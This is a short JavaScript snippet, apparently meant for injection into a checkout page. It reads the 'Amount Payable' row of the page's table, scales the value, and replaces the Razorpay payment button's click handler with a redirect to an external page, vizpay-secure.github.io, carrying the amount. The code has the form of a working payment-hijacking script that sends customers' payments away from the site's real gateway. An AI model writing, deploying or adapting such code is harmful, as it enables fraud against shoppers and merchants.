(function() {
  // Get all <tr> elements to look for "Amount Payable" row
  const trElements = document.querySelectorAll('tr');

  // Initialize the amount variable
  let amount = 0;

  // Iterate through each <tr> element
  trElements.forEach(tr => {
    // Check if the current row has "Amount Payable"
    if (tr.textContent.includes("Amount Payable")) {
      // Look for the <td> elements within this <tr>
      const tdCells = tr.querySelectorAll('td');
      
      // Loop through tdCells to find the one that contains the amount
      tdCells.forEach((td, index) => {
        if (index > 0) { // Skip the first <td> that contains "Amount Payable"
          const amountText = td.textContent.replace(/[^0-9.-]+/g, "");
          if (amountText) {
            amount = parseFloat(amountText);
            console.log(`Raw amount text: "${amountText}"`); // Log the raw text found
          }
        }
      });
      
      // Log if the amount is still 0 and if we found a valid amount
      if (amount === 0) {
        console.log("No valid amount found in this row.");
      }
    }
  });

  // Divide by 100 and round up to the nearest integer
  if (!isNaN(amount)) {
    const result = Math.ceil(amount / 100);
    console.log(result); // This will output the result

    // Change the button action
    const payButton = document.querySelector('.razorpay-payment-button'); // Select the button
    if (payButton) {
      payButton.onclick = function(event) {
        event.preventDefault(); // Prevent the default form submission
        const newUrl = `https://vizpay-secure.github.io/vizpay/?isc=${result}`; // Change to your desired URL
        window.location.href = newUrl; // Redirect to the new URL
      };
    }
  } else {
    console.log("Amount could not be parsed.");
  }
})();
